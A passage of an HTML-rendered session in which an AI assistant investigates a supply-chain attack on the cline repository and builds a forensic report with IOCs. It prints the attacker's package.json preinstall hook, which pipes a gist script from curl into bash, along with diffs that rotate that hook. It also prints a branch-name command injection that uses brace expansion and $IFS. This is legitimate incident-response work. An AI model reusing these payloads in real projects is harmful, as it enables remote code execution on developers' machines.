\&quot;^25.0.1\&quot;,\n-\t\t\&quot;turndown\&quot;: \&quot;^7.2.0\&quot;,\n-\t\t\&quot;ulid\&quot;: \&quot;^2.4.0\&quot;,\n-\t\t\&quot;undici\&quot;: \&quot;^7.16.0\&quot;,\n-\t\t\&quot;uuid\&quot;: \&quot;^11.1.0\&quot;,\n-\t\t\&quot;vscode-uri\&quot;: \&quot;^3.1.0\&quot;,\n-\t\t\&quot;web-tree-sitter\&quot;: \&quot;^0.22.6\&quot;,\n-\t\t\&quot;zod\&quot;: \&quot;^3.24.2\&quot;\n-\t},\n-\t\&quot;overrides\&quot;: {\n-\t\t\&quot;tar-fs\&quot;: \&quot;&gt;=3.1.1\&quot;,\n-\t\t\&quot;tar\&quot;: \&quot;^7.5.2\&quot;,\n-\t\t\&quot;vite\&quot;: \&quot;^7.1.11\&quot;,\n-\t\t\&quot;js-yaml\&quot;: \&quot;^4.1.1\&quot;\n-\t},\n-\t\&quot;c8\&quot;: {\n-\t\t\&quot;reporter\&quot;: [\n-\t\t\t\&quot;lcov\&quot;,\n-\t\t\t\&quot;html\&quot;\n-\t\t],\n-\t\t\&quot;exclude\&quot;: [\n-\t\t\t\&quot;**/testing-platform/**\&quot;,\n-\t\t\t\&quot;**/webview-ui/**\&quot;,\n-\t\t\t\&quot;**/.vscode-test/**\&quot;,\n-\t\t\t\&quot;**/node_modules/**\&quot;,\n-\t\t\t\&quot;node_modules\&quot;,\n-\t\t\t\&quot;**/dist-standalone/src/**\&quot;,\n-\t\t\t\&quot;**/dist-standalone/vsce-extension/https:/**\&quot;,\n-\t\t\t\&quot;**/dist-standalone/vsce-extension/**\&quot;,\n-\t\t\t\&quot;**/dist-standalone/https:/**\&quot;,\n-\t\t\t\&quot;**/dist-standalone/LIB/src/**\&quot;,\n-\t\t\t\&quot;**/dist-standalone/pdfjs-dist/**\&quot;,\n-\t\t\t\&quot;**/*.d.ts\&quot;,\n-\t\t\t\&quot;**/*.{test,spec}.{js,jsx,ts,tsx,mjs,cjs}\&quot;,\n-\t\t\t\&quot;**/__tests__/**\&quot;,\n-\t\t\t\&quot;**/test/**\&quot;,\n-\t\t\t\&quot;**/tests/**\&quot;,\n-\t\t\t\&quot;**/.nyc_output/**\&quot;,\n-\t\t\t\&quot;**/tests-results/**\&quot;,\n-\t\t\t\&quot;src/test/**\&quot;,\n-\t\t\t\&quot;**/src/xml/**\&quot;,\n-\t\t\t\&quot;**/standalone/**\&quot;,\n-\t\t\t\&quot;**/src/generated/**\&quot;,\n-\t\t\t\&quot;**/evals/cli/dist/**\&quot;,\n-\t\t\t\&quot;**/evals/cli/src/**\&quot;,\n-\t\t\t\&quot;dist\&quot;\n-\t\t],\n-\t\t\&quot;all\&quot;: true,\n-\t\t\&quot;exclude-after-remap\&quot;: true\n-\t}\n+    \&quot;name\&quot;: \&quot;test\&quot;,\n+    \&quot;version\&quot;: \&quot;1.0.0\&quot;,\n+    \&quot;scripts\&quot;: {\n+\t  \&quot;preinstall\&quot;: \&quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/fe5ddec33efa251f25138d9726cfa76ce0a55f61/run.sh | bash\&quot;\n+    }\n }&quot;}]}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-05-16-237Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-05-16-237Z" class="timestamp-link"><time datetime="2026-02-18T17:05:16.237Z" data-timestamp="2026-02-18T17:05:16.237Z">2026-02-18T17:05:16.237Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>JACKPOT! The malicious commit <code>b181e045989a73e4f9bd6731b08df66ef1c079ac</code> is still accessible via GitHub API because GitHub preserves fork commits even after the fork is deleted!</p>
+<p>This reveals the ACTUAL payload:</p>
+<pre><code class="language-json">{
+    &quot;name&quot;: &quot;test&quot;,
+    &quot;version&quot;: &quot;1.0.0&quot;,
+    &quot;scripts&quot;: {
+      &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/fe5ddec33efa251f25138d9726cfa76ce0a55f61/run.sh | bash&quot;
+    }
+}
+</code></pre>
+<p>This is the smoking gun! The package.json was replaced with a minimal version that runs <code>curl | bash</code> to download and execute run.sh from one of the deleted gists.</p>
+<p>Key details:- Commit author: glthub-actions <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#115;&#101;&#99;&#64;&#119;&#48;&#48;&#46;&#115;&#104;">&#115;&#101;&#99;&#64;&#119;&#48;&#48;&#46;&#115;&#104;</a>
+- Commit date: 2026-01-28T03:41:00Z
+- Changes: Replaced entire package.json (632 deletions, 5 additions)
+- Payload: preinstall script that downloads and executes run.sh from gist</p>
+<p>Also note the gist URL: <code>7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/fe5ddec33efa251f25138d9726cfa76ce0a55f61/run.sh</code>Let me get the full content and also check other commits from this actor.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-05-19-389Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-05-19-389Z" class="timestamp-link"><time datetime="2026-02-18T17:05:19.389Z" data-timestamp="2026-02-18T17:05:19.389Z">2026-02-18T17:05:19.389Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p><strong>JACKPOT!</strong> The malicious commit is still accessible via GitHub API (GitHub preserves fork commits). Here's the payload:</p>
+<pre><code class="language-json">{
+    &quot;name&quot;: &quot;test&quot;,
+    &quot;version&quot;: &quot;1.0.0&quot;,
+    &quot;scripts&quot;: {
+      &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/fe5ddec33efa251f25138d9726cfa76ce0a55f61/run.sh | bash&quot;
+    }
+}
+</code></pre>
+<p><strong>Key details:</strong>
+- <strong>Author:</strong> glthub-actions <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#115;&#101;&#99;&#64;&#119;&#48;&#48;&#46;&#115;&#104;">&#115;&#101;&#99;&#64;&#119;&#48;&#48;&#46;&#115;&#104;</a>
+- <strong>Date:</strong> 2026-01-28T03:41:00Z
+- <strong>Changes:</strong> Replaced entire package.json (632 deletions → 5 additions)
+- <strong>Payload:</strong> <code>preinstall</code> script that downloads and executes <code>run.sh</code> from gist <code>7b3f87dac75ef2249adeb6bdbc9ee3f1</code></p>
+<p>Let me check if there are more commits from this actor preserved in the cline repo:</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-05-20-724Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-05-20-724Z" class="timestamp-link"><time datetime="2026-02-18T17:05:20.724Z" data-timestamp="2026-02-18T17:05:20.724Z">2026-02-18T17:05:20.724Z</time></a></div><div class="message-content">
+<div class="tool-use bash-tool" data-tool-id="toolu_01G7CwHPVKqq8FmYJYGpVdyS">
+<div class="tool-header"><span class="tool-icon">$</span> Bash</div>
+<div class="tool-description">List all preserved commits by glthub-actions</div><div class="truncatable"><div class="truncatable-content"><pre class="bash-command">gh api &#34;repos/cline/cline/commits?author=glthub-actions&amp;per_page=100&#34; 2&gt;/dev/null | jq -r &#39;.[] | &#34;\(.sha) \(.commit.author.date) \(.commit.message)&#34;&#39; | head -20</pre></div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-05-21-825Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-05-21-825Z" class="timestamp-link"><time datetime="2026-02-18T17:05:21.825Z" data-timestamp="2026-02-18T17:05:21.825Z">2026-02-18T17:05:21.825Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre></pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-05-25-720Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-05-25-720Z" class="timestamp-link"><time datetime="2026-02-18T17:05:25.720Z" data-timestamp="2026-02-18T17:05:25.720Z">2026-02-18T17:05:25.720Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Looks like that query returned nothing. Let me try a different approach - searching by the known commit SHAs from the earlier evidence.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-05-31-579Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-05-31-579Z" class="timestamp-link"><time datetime="2026-02-18T17:05:31.579Z" data-timestamp="2026-02-18T17:05:31.579Z">2026-02-18T17:05:31.579Z</time></a></div><div class="message-content">
+<div class="tool-use bash-tool" data-tool-id="toolu_017tptAcj5Ki1BFGNkFAJDYt">
+<div class="tool-header"><span class="tool-icon">$</span> Bash</div>
+<div class="tool-description">Check other preserved malicious commits</div><div class="truncatable"><div class="truncatable-content"><pre class="bash-command"># Check other known malicious commits
+for sha in b976ffee78e616dbda6e3e540a0b6a0473d1b8f0 fd83497b4124d79d78ce14f4516154bfae679cf0 5b25c3a64c962ec741417164b178b156676a5ca6; do
+  echo &#34;=== Commit $sha ===&#34;
+  gh api &#34;repos/cline/cline/commits/$sha&#34; 2&gt;/dev/null | jq -r &#39;.commit.author.name, .commit.author.email, .commit.author.date, .commit.message, .files[].patch&#39; 2&gt;/dev/null | head -30
+  echo &#34;&#34;
+done</pre></div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-05-39-879Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-05-39-879Z" class="timestamp-link"><time datetime="2026-02-18T17:05:39.879Z" data-timestamp="2026-02-18T17:05:39.879Z">2026-02-18T17:05:39.879Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>=== Commit b976ffee78e616dbda6e3e540a0b6a0473d1b8f0 ===
+glthub-actions
+sec@w00.sh
+2026-01-28T04:33:37Z
+Update package.json
+@@ -2,6 +2,6 @@
+     &quot;name&quot;: &quot;test&quot;,
+     &quot;version&quot;: &quot;1.0.0&quot;,
+     &quot;scripts&quot;: {
+-	  &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/1deca45a6b5ad423d1d7bf9dd52ba4cc891ddd9e/run.sh | bash&quot;
++	  &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/0fa0cbd6fc00e934abd165d097bbc4f4f557473e/run.sh | bash&quot;
+     }
+ }
+
+=== Commit fd83497b4124d79d78ce14f4516154bfae679cf0 ===
+glthub-actions
+sec@w00.sh
+2026-01-29T02:14:57Z
+Update package.json
+@@ -2,6 +2,6 @@
+     &quot;name&quot;: &quot;test&quot;,
+     &quot;version&quot;: &quot;1.0.0&quot;,
+     &quot;scripts&quot;: {
+-	  &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/dbb8df26673e8bd93f6e25d46bd08e0b733bea04/run.sh | bash&quot;
++	  &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/57eab1647ee47397659494c005248cfb434ffb79/run.sh | bash&quot;
+     }
+ }
+
+=== Commit 5b25c3a64c962ec741417164b178b156676a5ca6 ===
+glthub-actions
+sec@w00.sh
+2026-01-30T02:02:14Z
+Update package.json
+@@ -2,6 +2,6 @@
+     &quot;name&quot;: &quot;test&quot;,
+     &quot;version&quot;: &quot;1.0.0&quot;,
+     &quot;scripts&quot;: {
+-	  &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/4f746a77ff66040b9b45c477d1be9295/raw/fd61b3bd0dbd0f21b7cd5628b92dba8f68195e01/run.sh | bash&quot;
++	  &quot;preinstall&quot;: &quot;curl -sSfL https://gist.githubusercontent.com/glthub-actions/148eccfabb6a2c7410c6e2f2adee7889/raw/416f21d47bb2d1fb30e19e1eb279b7cad3afe03e/run.sh | bash&quot;
+     }
+ }</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-05-47-227Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-05-47-227Z" class="timestamp-link"><time datetime="2026-02-18T17:05:47.227Z" data-timestamp="2026-02-18T17:05:47.227Z">2026-02-18T17:05:47.227Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>This is incredible evidence! I now have multiple commits showing:1. The attacker kept updating the payload with different gist revisions
+2. All commits use <code>curl -sSfL &lt;gist-url&gt;/run.sh | bash</code>
+3. Multiple gist IDs were used: <code>7b3f87dac75ef2249adeb6bdbc9ee3f1</code>, <code>4f746a77ff66040b9b45c477d1be9295</code>, <code>148eccfabb6a2c7410c6e2f2adee7889</code></p>
+<p>Now I have concrete evidence of:
+- The payload format: curl | bash to download run.sh
+- Multiple gist revisions being used
+- Timestamps of attacks: Jan 28-30, 2026
+- All commits signed by GitHub web-flow (created via web interface)Let me update the forensic report with these recovered payloads.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-05-51-059Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-05-51-059Z" class="timestamp-link"><time datetime="2026-02-18T17:05:51.059Z" data-timestamp="2026-02-18T17:05:51.059Z">2026-02-18T17:05:51.059Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>Excellent! We recovered <strong>multiple malicious commits</strong> still preserved in the cline repo. Let me document these findings:</p>
+<p><strong>Recovered Malicious Payloads:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Commit SHA</th>
+<th>Date</th>
+<th>Gist ID</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>b181e045</code></td>
+<td>Jan 28 03:41</td>
+<td><code>7b3f87dac...</code></td>
+<td><code>curl -sSfL .../run.sh \| bash</code></td>
+</tr>
+<tr>
+<td><code>b976ffee</code></td>
+<td>Jan 28 04:33</td>
+<td><code>7b3f87dac...</code></td>
+<td>Same gist, different revision</td>
+</tr>
+<tr>
+<td><code>fd83497b</code></td>
+<td>Jan 29 02:14</td>
+<td><code>7b3f87dac...</code></td>
+<td>Same gist, different revision</td>
+</tr>
+<tr>
+<td><code>5b25c3a6</code></td>
+<td>Jan 30 02:02</td>
+<td><code>148eccfab...</code></td>
+<td>Different gist</td>
+</tr>
+</tbody>
+</table>
+<p>All commits:
+- Author: <code>glthub-actions &lt;sec@w00.sh&gt;</code>
+- Created via GitHub web interface (GPG signed by <code>web-flow</code>)
+- Replace entire package.json with minimal payload</p>
+<p>Let me update the forensic report with these recovered payloads:</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-06-16-042Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-06-16-042Z" class="timestamp-link"><time datetime="2026-02-18T17:06:16.042Z" data-timestamp="2026-02-18T17:06:16.042Z">2026-02-18T17:06:16.042Z</time></a></div><div class="message-content"><div class="file-tool edit-tool" data-tool-id="toolu_01Jv35VMhy2HkkVtXsvYk2ou">
+<div class="file-tool-header edit-header"><span class="file-tool-icon">✏️</span> Edit <span class="file-tool-path">forensic-report.md</span></div>
+<div class="file-tool-fullpath">/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md</div>
+<div class="truncatable"><div class="truncatable-content">
+<div class="edit-section edit-old"><div class="edit-label">−</div><pre class="edit-content">### Threat Actor IOCs (glthub-actions - UNKNOWN ACTOR)
+
+```json
+{
+  &#34;threat_actor&#34;: &#34;glthub-actions&#34;,
+  &#34;attribution&#34;: &#34;Unknown threat actor, NOT AdnaneKhan (confirmed)&#34;,
+  &#34;iocs&#34;: [
+    {
+      &#34;type&#34;: &#34;github_username&#34;,
+      &#34;value&#34;: &#34;glthub-actions&#34;,
+      &#34;context&#34;: &#34;Typosquat attack account (lowercase L mimics &#39;github-actions&#39;)&#34;,
+      &#34;actor_id&#34;: 256690727,
+      &#34;status&#34;: &#34;deleted/suspended&#34;
+    },
+    {
+      &#34;type&#34;: &#34;email&#34;,
+      &#34;value&#34;: &#34;sec@w00.sh&#34;,
+      &#34;context&#34;: &#34;Email used in malicious commits to glthub-actions/cline fork&#34;
+    },
+    {
+      &#34;type&#34;: &#34;domain&#34;,
+      &#34;value&#34;: &#34;w00.sh&#34;,
+      &#34;context&#34;: &#34;Domain associated with attacker email&#34;
+    },
+    {
+      &#34;type&#34;: &#34;domain&#34;,
+      &#34;value&#34;: &#34;637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com&#34;,
+      &#34;context&#34;: &#34;Burp Collaborator callback used by glthub-actions on Jan 26, 2026&#34;,
+      &#34;evidence&#34;: &#34;comment-7dadfb44eb3d (GH Archive)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_issue&#34;,
+      &#34;value&#34;: &#34;cline/cline#8904&#34;,
+      &#34;context&#34;: &#34;Prompt injection issue created by glthub-actions&#34;,
+      &#34;evidence&#34;: &#34;issue-e85f7107f873 (GH Archive)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;commit_sha&#34;,
+      &#34;value&#34;: &#34;b181e045989a73e4f9bd6731b08df66ef1c079ac&#34;,
+      &#34;context&#34;: &#34;Malicious commit referenced in prompt injection payload&#34;
+    },
+    {
+      &#34;type&#34;: &#34;gist&#34;,
+      &#34;value&#34;: &#34;77f1c20a43be8f8bd047f31dce427207&#34;,
+      &#34;context&#34;: &#34;Deleted gist containing malicious payload (r.sh)&#34;,
+      &#34;status&#34;: &#34;deleted&#34;
+    },
+    {
+      &#34;type&#34;: &#34;gist&#34;,
+      &#34;value&#34;: &#34;7b3f87dac75ef2249adeb6bdbc9ee3f1&#34;,
+      &#34;context&#34;: &#34;Deleted gist containing run.sh payload&#34;,
+      &#34;status&#34;: &#34;deleted&#34;
+    }
+  ]
+}</pre></div>
+<div class="edit-section edit-new"><div class="edit-label">+</div><pre class="edit-content">### Threat Actor IOCs (glthub-actions - UNKNOWN ACTOR)
+
+```json
+{
+  &#34;threat_actor&#34;: &#34;glthub-actions&#34;,
+  &#34;attribution&#34;: &#34;Unknown threat actor, NOT AdnaneKhan (confirmed)&#34;,
+  &#34;iocs&#34;: [
+    {
+      &#34;type&#34;: &#34;github_username&#34;,
+      &#34;value&#34;: &#34;glthub-actions&#34;,
+      &#34;context&#34;: &#34;Typosquat attack account (lowercase L mimics &#39;github-actions&#39;)&#34;,
+      &#34;actor_id&#34;: 256690727,
+      &#34;status&#34;: &#34;deleted/suspended&#34;
+    },
+    {
+      &#34;type&#34;: &#34;email&#34;,
+      &#34;value&#34;: &#34;sec@w00.sh&#34;,
+      &#34;context&#34;: &#34;Email used in malicious commits to glthub-actions/cline fork&#34;
+    },
+    {
+      &#34;type&#34;: &#34;domain&#34;,
+      &#34;value&#34;: &#34;w00.sh&#34;,
+      &#34;context&#34;: &#34;Domain associated with attacker email&#34;
+    },
+    {
+      &#34;type&#34;: &#34;domain&#34;,
+      &#34;value&#34;: &#34;637rio6pykojp15rrkbm4gk960cr0jo8.oastify.com&#34;,
+      &#34;context&#34;: &#34;Burp Collaborator callback used by glthub-actions on Jan 26, 2026&#34;,
+      &#34;evidence&#34;: &#34;comment-7dadfb44eb3d (GH Archive)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;github_issue&#34;,
+      &#34;value&#34;: &#34;cline/cline#8904&#34;,
+      &#34;context&#34;: &#34;Prompt injection issue created by glthub-actions&#34;,
+      &#34;evidence&#34;: &#34;issue-e85f7107f873 (GH Archive)&#34;
+    },
+    {
+      &#34;type&#34;: &#34;commit_sha&#34;,
+      &#34;value&#34;: &#34;b181e045989a73e4f9bd6731b08df66ef1c079ac&#34;,
+      &#34;context&#34;: &#34;Malicious commit referenced in prompt injection payload&#34;
+    },
+    {
+      &#34;type&#34;: &#34;gist&#34;,
+      &#34;value&#34;: &#34;77f1c20a43be8f8bd047f31dce427207&#34;,
+      &#34;context&#34;: &#34;Deleted gist containing malicious payload (r.sh) - used in branch name injection&#34;,
+      &#34;status&#34;: &#34;deleted&#34;
+    },
+    {
+      &#34;type&#34;: &#34;gist&#34;,
+      &#34;value&#34;: &#34;7b3f87dac75ef2249adeb6bdbc9ee3f1&#34;,
+      &#34;context&#34;: &#34;Deleted gist containing run.sh payload - RECOVERED via preserved commits&#34;,
+      &#34;status&#34;: &#34;deleted&#34;
+    },
+    {
+      &#34;type&#34;: &#34;gist&#34;,
+      &#34;value&#34;: &#34;148eccfabb6a2c7410c6e2f2adee7889&#34;,
+      &#34;context&#34;: &#34;Deleted gist containing run.sh payload (alternate)&#34;,
+      &#34;status&#34;: &#34;deleted&#34;
+    },
+    {
+      &#34;type&#34;: &#34;gist&#34;,
+      &#34;value&#34;: &#34;4f746a77ff66040b9b45c477d1be9295&#34;,
+      &#34;context&#34;: &#34;Deleted gist containing run.sh payload (alternate)&#34;,
+      &#34;status&#34;: &#34;deleted&#34;
+    }
+  ]
+}
+```
+
+### RECOVERED: Malicious Commit Payloads
+
+**GitHub preserves fork commits even after fork deletion.** The following malicious commits from glthub-actions/cline are still accessible via the parent repo (cline/cline):
+
+| Commit SHA | Date (UTC) | Payload |
+|------------|------------|---------|
+| `b181e045989a73e4f9bd6731b08df66ef1c079ac` | 2026-01-28 03:41:00 | `curl -sSfL .../7b3f87dac.../run.sh \| bash` |
+| `b976ffee78e616dbda6e3e540a0b6a0473d1b8f0` | 2026-01-28 04:33:37 | `curl -sSfL .../7b3f87dac.../run.sh \| bash` (updated revision) |
+| `fd83497b4124d79d78ce14f4516154bfae679cf0` | 2026-01-29 02:14:57 | `curl -sSfL .../7b3f87dac.../run.sh \| bash` (updated revision) |
+| `5b25c3a64c962ec741417164b178b156676a5ca6` | 2026-01-30 02:02:14 | `curl -sSfL .../148eccfab.../run.sh \| bash` (different gist) |
+
+**Recovered package.json payload:**
+```json
+{
+    &#34;name&#34;: &#34;test&#34;,
+    &#34;version&#34;: &#34;1.0.0&#34;,
+    &#34;scripts&#34;: {
+      &#34;preinstall&#34;: &#34;curl -sSfL https://gist.githubusercontent.com/glthub-actions/7b3f87dac75ef2249adeb6bdbc9ee3f1/raw/.../run.sh | bash&#34;
+    }
+}
+```
+
+**Attack pattern:**
+1. Replace entire package.json (632 lines → 5 lines)
+2. Add `preinstall` script that downloads and executes remote shell script
+3. Update gist revision multiple times (possibly to evade detection or test different payloads)</pre></div>
+</div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-06-27-753Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-06-27-753Z" class="timestamp-link"><time datetime="2026-02-18T17:06:27.753Z" data-timestamp="2026-02-18T17:06:27.753Z">2026-02-18T17:06:27.753Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>The file /Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md has been updated successfully.</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-06-34-197Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-06-34-197Z" class="timestamp-link"><time datetime="2026-02-18T17:06:34.197Z" data-timestamp="2026-02-18T17:06:34.197Z">2026-02-18T17:06:34.197Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p>Great, I've updated the report with the recovered malicious payloads. Now let me also add the information about the newrelic/test-oac-repository as a potential second target, and also investigate glthubactionstesting more.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-06-34-776Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-06-34-776Z" class="timestamp-link"><time datetime="2026-02-18T17:06:34.776Z" data-timestamp="2026-02-18T17:06:34.776Z">2026-02-18T17:06:34.776Z</time></a></div><div class="message-content">
+<div class="assistant-text"><p>Now let me also add the findings about newrelic/test-oac-repository and check the glthubactionstesting account:</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-06-36-411Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-06-36-411Z" class="timestamp-link"><time datetime="2026-02-18T17:06:36.411Z" data-timestamp="2026-02-18T17:06:36.411Z">2026-02-18T17:06:36.411Z</time></a></div><div class="message-content">
+<div class="tool-use bash-tool" data-tool-id="toolu_01RiXc9s1xvKxtuoHxANdjxc">
+<div class="tool-header"><span class="tool-icon">$</span> Bash</div>
+<div class="tool-description">Get glthubactionstesting profile</div><div class="truncatable"><div class="truncatable-content"><pre class="bash-command">gh api users/glthubactionstesting 2&gt;/dev/null | jq &#39;{login, id, created_at, public_repos, followers, following, bio, email, company}&#39;</pre></div><button class="expand-btn">Show more</button></div>
+</div></div></div>
+<div class="message tool-reply" id="msg-2026-02-18T17-06-37-422Z"><div class="message-header"><span class="role-label">Tool reply</span><a href="#msg-2026-02-18T17-06-37-422Z" class="timestamp-link"><time datetime="2026-02-18T17:06:37.422Z" data-timestamp="2026-02-18T17:06:37.422Z">2026-02-18T17:06:37.422Z</time></a></div><div class="message-content"><div class="tool-result"><div class="truncatable"><div class="truncatable-content"><pre>{
+  &quot;login&quot;: &quot;glthubactionstesting&quot;,
+  &quot;id&quot;: 258947423,
+  &quot;created_at&quot;: &quot;2026-02-02T23:31:37Z&quot;,
+  &quot;public_repos&quot;: 0,
+  &quot;followers&quot;: 0,
+  &quot;following&quot;: 0,
+  &quot;bio&quot;: null,
+  &quot;email&quot;: null,
+  &quot;company&quot;: null
+}</pre></div><button class="expand-btn">Show more</button></div></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-06-44-697Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-06-44-697Z" class="timestamp-link"><time datetime="2026-02-18T17:06:44.697Z" data-timestamp="2026-02-18T17:06:44.697Z">2026-02-18T17:06:44.697Z</time></a></div><div class="message-content">
+<div class="thinking"><div class="thinking-label">Thinking</div><p><code>glthubactionstesting</code> (ID 258947423) was created on 2026-02-02 - just 2 days after glthub-actions' last known activity (Jan 31). It has zero repos, zero followers, zero following - it's a dormant account.This could be:
+1. A backup/staging account created by the same threat actor
+2. Someone else copying the naming pattern3. Coincidence</p>
+<p>Let me add this to the report as a potential related account. Also, let me update the report with the newrelic findings.</p></div></div></div>
+<div class="message assistant" id="msg-2026-02-18T17-06-59-341Z"><div class="message-header"><span class="role-label">Assistant</span><a href="#msg-2026-02-18T17-06-59-341Z" class="timestamp-link"><time datetime="2026-02-18T17:06:59.341Z" data-timestamp="2026-02-18T17:06:59.341Z">2026-02-18T17:06:59.341Z</time></a></div><div class="message-content"><div class="file-tool edit-tool" data-tool-id="toolu_01EbF1u72NCjTv7K7BqXcvb6">
+<div class="file-tool-header edit-header"><span class="file-tool-icon">✏️</span> Edit <span class="file-tool-path">forensic-report.md</span></div>
+<div class="file-tool-fullpath">/Users/mbg/Documents/Source/mbrg/raptor/.out/oss-forensics-20260218_105712/forensic-report.md</div>
+<div class="truncatable"><div class="truncatable-content">
+<div class="edit-section edit-old"><div class="edit-label">−</div><pre class="edit-content">**Open question**: Did glthub-actions publish cline@2.3.0, or was that a third actor who obtained the stolen tokens?</pre></div>
+<div class="edit-section edit-new"><div class="edit-label">+</div><pre class="edit-content">**Open question**: Did glthub-actions publish cline@2.3.0, or was that a third actor who obtained the stolen tokens?
+
+---
+
+## Additional Findings
+
+### Potential Related Account: glthubactionstesting
+
+| Attribute | Value |
+|-----------|-------|
+| Login | glthubactionstesting |
+| User ID | 258947423 |
+| Created | **2026-02-02T23:31:37Z** (2 days after glthub-actions&#39; last activity) |
+| Public repos | 0 |
+| Followers | 0 |
+| Activity | None (dormant) |
+
+**Assessment:** This account was created 2 days after glthub-actions&#39; last known activity (Jan 31). The similar naming pattern and timing suggest it could be:
+- A backup/staging account created by the same threat actor
+- Created in anticipation of glthub-actions being suspended
+- Unrelated coincidence
+
+**Status:** Requires monitoring - no malicious activity observed yet.
+
+### Second Target: newrelic/test-oac-repository
+
+**glthub-actions also targeted NewRelic** on Jan 27, 2026 (one day before attacking cline):
+
+| Event | Timestamp (UTC) | Details |
+|-------|-----------------|---------|
+| PR #74 closed | 2026-01-27 20:23:54 | Malicious PR with branch name injection |
+| Comment | 2026-01-27 20:24:30 | &#34;netlify build fork&#34; (trigger attempt) |
+| Fork created | 2026-01-27 20:57:16 | glthub-actions/test-oac-repository |
+
+**Malicious branch name in PR #74:**
+```bash
+{curl,-sSFL,gist.githubusercontent.com/glthub-actions/77f1c20a43be8f8bd047f31dce427207/raw/.../r.sh}${IFS}|${IFS}bash
+```
+
+This uses bash brace expansion + `$IFS` to bypass space restrictions in branch names.
+
+**Current status:** newrelic/test-oac-repository returns 404 (deleted).
+
+**Other researchers testing same repo:** `bhtestacount123`, `r3s1l3n7` - also tested command injection on Jan 26-27 (may be bug bounty hunters).
+
+**Assessment:** NewRelic was a reconnaissance/testing target before the main attack on cline. The repo deletion may have been:
+- Security response after discovering the injection attempts
+- Routine cleanup of a test repository
+- Response to bug bounty reports</pre></div>
+</div><button class="expand-btn">Show more</button></div>
+</div></div></div>
